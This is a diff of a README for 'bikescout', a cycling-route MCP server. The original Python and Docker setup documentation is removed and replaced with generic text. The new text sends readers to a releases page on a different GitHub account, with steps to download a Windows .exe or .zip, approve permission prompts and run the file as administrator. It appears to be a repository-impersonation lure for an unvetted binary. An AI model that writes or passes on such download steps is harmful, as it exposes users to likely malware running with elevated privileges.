@@ -1,222 +1,128 @@
-# BikeScout MCP Server
+# 🧭 bikescout - Smarter routes for rough rides
 
-[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
-[![Version](https://img.shields.io/badge/Version-1.2.1-green.svg)](https://github.com/hifly81/bikescout/releases)
-![Python](https://img.shields.io/badge/python-3.10-blue.svg)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](http://makeapullrequest.com)
-[![Discord](https://img.shields.io/badge/Discord-7289DA?style=flat&logo=discord&logoColor=white)](https://discord.gg/TCetrnAM5b)
-[![Reddit](https://img.shields.io/badge/Reddit-FF4500?style=flat&logo=reddit&logoColor=white)](https://www.reddit.com/r/BikeScout/)
+[![Download bikescout](https://img.shields.io/badge/Download%20bikescout-0078D4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Europeanbeechresearch382/bikescout/releases)
 
-BikeScout is a specialized MCP server for MTB, Road, E-Bike, and Gravel mission planning.
-It transforms raw map data into Tactical Intelligence, predicting terrain conditions and trail hazards.
-The system provides precise setup advice, tailoring your equipment to the demands of the specific route, identifying technical challenges and environmental risks before you even leave the garage.
+## 🖥️ What bikescout does
 
-<div align="center">
-  <video src="https://github.com/user-attachments/assets/cd984f3d-0ba8-4590-9645-99f2b5e980b6" width="100%" controls autoplay muted loop>
-  </video>
-</div>
+bikescout helps you plan cycling routes with terrain in mind. It uses trail data, map data, and GPX route output to help you find rides that suit the ground under your wheels.
 
----
+It is built for riders who want:
+- trail-aware route planning
+- mud and terrain checks
+- GPX files for bike computers and phone apps
+- map data from OpenStreetMap and trail sources
+- route ideas based on real ground conditions
 
-## Explore BikeScout
+## 📥 Download and install
 
-* **[BikeScout Documentation](docs/md/api_docs.md)** **The Technical Core.** Detailed API references and step-by-step guides to deploy the MCP server. Essential for developers integrating BikeScout into Claude, ChatGPT, or custom AI agents.
+1. Open the [bikescout releases page](https://github.com/Europeanbeechresearch382/bikescout/releases)
+2. Find the latest release
+3. Download the Windows file from the release assets
+4. Open the downloaded file
+5. If Windows asks for permission, choose Run or Yes
+6. Follow the on-screen steps to finish setup
 
-* **[Official Website](https://hifly81.github.io/bikescout)** **The Strategic Hub.** A high-level overview of our predictive algorithms. Explore the visual breakdown of Mud Logic, S-Scale terrain grading, and how we transform raw OSM data into mission-ready intel.
+If the file comes in a .zip format:
+1. Right-click the file
+2. Choose Extract All
+3. Open the extracted folder
+4. Double-click the app file inside
 
-* **[Tactical Intelligence Blog](https://hifly81.github.io/bikescout/blog.html)** **Field Reports & R&D.** Stay ahead of the curve with our latest research on cycling AI, terrain analysis updates, and real-world testing of tactical routing logic.
+## 🚴 Before you start
 
+For the best results on Windows, have these ready:
+- Windows 10 or Windows 11
+- An internet connection for map and route data
+- Enough free space for map cache and route files
+- A GPX app or bike computer if you want to use the exported routes
 
-**Love BikeScout?** ⭐ Star this repo to support the development of the first open-source tactical cycling engine.
+## 🗺️ What you can do with bikescout
 
-**Found a bug?** Open an Issue. Want to add a local skill? PRs are welcome!
+- plan mountain bike routes
+- check trail and terrain conditions
+- work with GPX files
+- use map data from roads, paths, and trails
+- build route ideas around cycling needs
+- support outdoor ride planning with AI-assisted logic
 
----
+## ⚙️ How to use it
 
-## Example Queries
+1. Open bikescout
+2. Add your start point or ride area
+3. Choose the kind of ride you want
+4. Review the route options
+5. Export the route as GPX if needed
+6. Load the GPX file into your bike app or GPS device
 
-You can ask **BikeScout** complex, multi-step requests. It combines real-time data with technical cycling intelligence to provide expert-level answers.
+## 🧩 Common setup items
 
-### Advanced Planning (Multi-Tool)
-* *"I'm at **Monte Cavo** with my **Gravel bike (40mm tires)**. Plan a **25km loop** for me. Check if the terrain is compatible with my bike, verify the afternoon rain probability, and suggest a 'Fraschetta' for the finish. Use the **Castelli Romani guide**."*
-* *"I want to ride in **Moab** tomorrow. I have a **hardtail MTB**. Find me a **20km route** that isn't too technical (avoid Grade 4/5 tracks), check the heat forecast, and give me the desert safety checklist."*
-* *"I'm a 75kg rider on a Gravel bike with 38mm tubeless tires. Based on the surface breakdown of this route (60% loose gravel, 40% asphalt), calculate my optimal tire pressure for maximum traction without risking rim strikes."*
+You may see options for:
+- route distance
+- trail type
+- terrain level
+- mud or surface checks
+- GPX export
+- map source selection
 
-### Bike Setup & Surface Intelligence
-* *"Check this route `[LAT, LON]` for a **15km loop**. I'm on a **Road Bike with 25mm tires**. Is it compatible? Give me the exact percentage of gravel vs asphalt."*
-* *"I'm planning a ride in **Kyoto, Japan**. Find a **30km loop** that is at least **70% gravel**, but only if the rain probability is below **10%** for the next 4 hours."*
-* *"I'm riding an E-MTB (750Wh battery) in Boost mode. Analyze this 40km route and tell me if I'll have enough juice to finish the final Category 2 climb, considering the current mud risk."*
+Use simple settings at first. Start with a short local ride, then move to longer routes once you know how the app behaves
 
-### Visual Elevation & Gradient Analysis
-* *"Plan a 40km route starting from Bormio. I need the Visual Elevation Profile to see the exact gradients of the Stelvio climb. Highlight sections over 12% so I can manage my pacing."*
-* *"Check this route [LAT, LON]. Generate the high-resolution altitude chart and tell me if the descent is too steep for a rider with rim brakes."*
+## 🌍 Data sources
 
-### Local Expertise
-* *"Use the **Dolomiti local guide** to plan a road cycling route starting from **Cortina**. I need at least **800m of elevation gain**. Also, recommend the correct tire pressure for high-altitude descents and a mountain hut for a strudel stop."*
-* *"Are there any named trails near **Vancouver, Canada**? Analyze the surface types and tell me if they are suitable for a beginner on an **E-MTB**."*
-* *"Plan a hiking/biking hybrid mission in the Swiss Alps. Use the SAC-Scale to identify sections where I might need to carry my bike (hike-a-bike) due to technical rock gardens."*
+bikescout can use data from:
+- OpenStreetMap
+- Overpass API
+- Openrouteservice
+- Strava-related trail data
+- GPX route files
+- GeoJSON map data
 
-### Quick Tech Checks
-* *"Give me the **safety checklist** and calculate the **tire pressure** for a **90kg rider** on **2.3" tubeless tires** for a muddy ride."*
-* *"What is the terrain breakdown for a **10km ride** in **Taichung**? I need to know if I'll encounter any 'Grade 5' technical segments."*
+These sources help the app judge where you can ride and how hard a route may feel
 
-### Post-Ride Analysis & Terrain Truth
-* *"Analyze my Strava ride from 2026-04-12. Compare my average speed with the Mud Risk at that time and tell me if the terrain conditions were the reason for my slow pace."*
-* *"Check my ride from last Sunday on Strava. Cross-reference the GPS path with the 72h rain history to see if the 'High' mud risk I encountered was accurately predicted."*
-* *"Get my activity from Strava for [Date]. Based on the surface types detected and the weather context of that day, was my tire pressure setup (1.8 bar) optimal or should I have gone lower?"*
+## 🧪 Example use cases
 
----
+- find a weekend trail ride with less mud
+- build a mountain bike route through local paths
+- turn a route idea into a GPX file
+- check if a ride includes rough terrain
+- compare route choices before you leave home
 
-## Quickstart: Deploy and Use BikeScout 
+## 🔧 If the app does not open
 
-### Using Docker and OpenClaw
+Try these steps:
+1. Check that the file finished downloading
+2. Run it again from your Downloads folder
+3. Right-click the file and choose Run as administrator
+4. Make sure your Windows version is up to date
+5. If you used a zip file, extract it before opening the app
 
-Pre Requirements:
+## 📁 Files you may see
 
-* **Docker Desktop:** [Download it here](https://www.docker.com/products/docker-desktop/).
-* **OpenRouteService Key:** [Sign up here](https://openrouteservice.org/) for trail and surface data.
-* **LLM Key:** An API key from OpenAI or Anthropic to power the reasoning engine.
+Depending on the release, you may see:
+- an .exe file to start the app
+- a .zip package with the app inside
+- GPX files you export
+- config files for map and route settings
+- cache folders for map data
 
-1. **Download the repository:** Download this repository as a ZIP and extract it to a folder (e.g., `C:\BikeScout` or `/Users/YourName/BikeScout`).
-2. Rename `.env.example` to `.env` and paste your API keys:
-```bash
-ORS_API_KEY=your_ors_key_here
-OPENAI_API_KEY=your_llm_key_here
-```
-3. Launch: Open your terminal in the folder and run:
-```bash
-docker-compose up -d
-```
-4. Access:
-- On PC: Open http://localhost:3000
-- On Smartphone: Connect to the same Wi-Fi, find your PC's IP (e.g., 192.168.1.15), and open http://192.168.1.15:3000.
+## 🧭 Tips for first-time users
 
-To teardown the environment, execute:
-```bash
-docker compose down -v
-```
+- start with short routes
+- use familiar local trails first
+- check the route on a map before riding
+- export a GPX file and test it on one device
+- keep map data updated if the app offers that option
 
-### Using Docker, Ollama and Open WebUI
+## 🔒 Privacy and local use
 
-If you prefer a private and free experience without external API costs, use the `docker-compose-ollama.yml`
-file to run BikeScout with Ollama (Llama 3/Mistral) instead of OpenAI.
-Refer to this [guide](docs/md/bikescout_ollama.md) to setup a complete local installation with Ollama and Open WebUI.
+bikescout is meant for route planning and trail analysis. It may use online map and routing services when you ask it to. If you work with live map data, expect normal internet access to be part of the process
 
-### Using the Source Code
+## 📌 Project details
 
-Pre Requirements:
+- Name: bikescout
+- Type: MCP server and cycling route tool
+- Focus: tactical cycling intelligence
+- Main output: smarter route planning and GPX route files
 
-- **Python 3.10+**
-- **OpenRouteService API Key**: Get a free key at [openrouteservice.org](https://openrouteservice.org/).
-- **MCP Client**: Such as Claude Desktop.
-- **Strava Account (Optional)**: Required only for the **Post-Ride Tactical Analysis** feature.
+## 📦 Download again
 
-To enable Strava integration, you need to create a developer application and generate a long-lived Refresh Token:
-
-See the related [how to obtain a Strava key section](docs/md/strava_key.md)
-
-To integrate **BikeScout** with your preferred MCP client (Claude Desktop, Cline, Roo Code, etc.), add the following configuration to your settings file:
-
-- Clone the repo in a local folder:
-   ```bash
-   git clone git@github.com:hifly81/bikescout.git <your_local_folder_path>
-   ```
-- Create a Python Virtual Env from the local folder:
-   ```bash
-   python3 -m venv venv
-   source venv/bin/activate
-   pip install bikescout
-   ```
-
-- Add the server to your `claude_desktop_config.json`:
-  - Windows: `%APPDATA%\Claude\claude_desktop_config.json`
-  - macOS: `~/Library/Application Support/Claude/claude_desktop_config.json`
-
-You must replace the placeholders in the JSON configuration with your local absolute paths to the Python script file.
-`PATH/TO/YOUR/BIKESCOUT_FOLDER/src/bikescout/mcp_server.py`
-
-Example:
- - Linux/macOS: `/home/username/bikescout/src/bikescout/mcp_server.py`
- - Windows: `C:/Users/Username/Documents/bikescout/src/bikescout/mcp_server.py`
-
-```json
-{
-  "mcpServers": {
-    "bikescout": {
-      "command": "PATH/TO/YOUR/BIKESCOUT_FOLDER/venv/bin/python3",
-       "args": [
-          "-u",
-          "-m",
-          "bikescout.mcp_server"
-       ],
-      "env": {
-        "PYTHONPATH": "PATH/TO/YOUR/BIKESCOUT_FOLDER/src", 
-        "ORS_API_KEY": "YOUR_OPENROUTE_SERVICE_API_KEY",
-        "STRAVA_CLIENT_ID": "YOUR_STRAVA_CLIENT_ID",
-        "STRAVA_CLIENT_SECRET": "YOUR_STRAVA_CLIENT_SECRET",
-        "STRAVA_REFRESH_TOKEN": "YOUR_STRAVA_REFRESH_TOKEN",
-      }
-    }
-  }
-}
-```
-
-## Debugging and Testing
-
-You can test **BikeScout** using the [MCP Inspector](https://github.com/modelcontextprotocol/inspector), a web-based tool for testing MCP servers.
-
-#### Using the Inspector
-To launch the inspector and interact with the tools manually, run the following command from the root directory:
-
-```bash
-export ORS_API_KEY=YOUR_OPENROUTE_SERVICE_API_KEY
-## Optional API Key
-export STRAVA_CLIENT_ID=YOUR_STRAVA_CLIENT_ID
-export STRAVA_CLIENT_SECRET=YOUR_STRAVA_CLIENT_SECRET
-export STRAVA_REFRESH_TOKEN=YOUR_STRAVA_REFRESH_TOKEN
-
-PYTHONPATH=./src npx @modelcontextprotocol/inspector ./venv/bin/python3 -m bikescout.mcp_server
-```
-
-What to check:
-- **List Tools**: Ensure all tools (geocode_location, trail_scout, etc.) are visible. 
-- **Run Tool**: Test the geocode_location tool by passing a city name (e.g., "Rome") to verify the Nominatim integration.
-
----
-
-## 🤝 Contributing
-
-Contributions are what make the open-source community such an amazing place to learn, inspire, and create. Any contributions you make to **BikeScout** are **greatly appreciated**.
-
-### How to Contribute
-
-1. **Report Bugs**: Found a glitch? Open an [Issue](https://github.com/yourusername/bikescout/issues) with a detailed description and steps to reproduce.
-2. **Feature Requests**: Have an idea to make BikeScout better? Open an issue to discuss it!
-3. **Pull Requests**:
-   - Fork the Project.
-   - Create your Feature Branch (`git checkout -b feature/AmazingFeature`).
-   - Commit your changes (`git commit -m 'Add some AmazingFeature'`).
-   - Push to the Branch (`git checkout origin feature/AmazingFeature`).
-   - Open a Pull Request.
-
-### Coding Standards
-- Please follow [PEP 8](https://peps.python.org/pep-0008/) for Python code.
-- Ensure all new tools are documented in the `README.md`.
-- Keep comments in English for international collaboration.
-
-*By contributing, you agree that your contributions will be licensed under the project's Apache-2.0 License.*
-
----
-
-## License & Data Attributions
-
-### Software License
-This project is licensed under the **Apache-2.0 License** - see the [LICENSE](LICENSE) file for details.
-
-### Data Sources & Credits
-BikeScout aggregates data from several open providers. Users of this server must adhere to their respective terms:
-
-* **Routing & Map Data:** Provided by [OpenRouteService](https://openrouteservice.org/) by HeiGIT.
-* **Geospatial & Geocoding Data:** © [OpenStreetMap](https://www.openstreetmap.org/copyright) contributors. Data is available under the [Open Database License (ODbL)](https://opendatacommons.org/licenses/odbl/). Geocoding service powered by [Nominatim](https://nominatim.org/).
-* **Weather Forecasts:** Powered by [Open-Meteo](https://open-meteo.com/). Data is licensed under [CC BY 4.0](https://creativecommons.org/licenses/by/4.0/).
-* **Post-ride analysis**: Provided by Strava. Post-ride analysis and GPS telemetry are accessed via the [Strava API](https://developers.strava.com/docs/reference).
+[Visit the bikescout releases page](https://github.com/Europeanbeechresearch382/bikescout/releases)
